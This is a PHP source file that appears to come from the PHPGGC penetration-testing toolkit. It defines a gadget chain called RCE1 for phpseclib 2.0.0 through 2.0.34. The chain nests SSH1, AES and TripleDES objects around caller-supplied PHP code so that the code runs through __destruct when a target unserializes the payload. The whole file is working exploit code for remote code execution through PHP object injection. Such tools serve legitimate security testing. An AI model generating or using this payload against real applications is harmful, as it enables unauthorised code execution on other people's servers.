<?php

namespace GadgetChain\PHPSecLib;

class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '2.0.0 <= 2.0.34';
    public static $vector = '__destruct';
    public static $author = 'crlf';
    public static $information = 'Generates warnings and notices.';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return [
            new \phpseclib\Net\SSH1(
                new \phpseclib\Crypt\AES(
                    new \phpseclib\Crypt\TripleDES($code)
                )
            )
        ];
    }
}
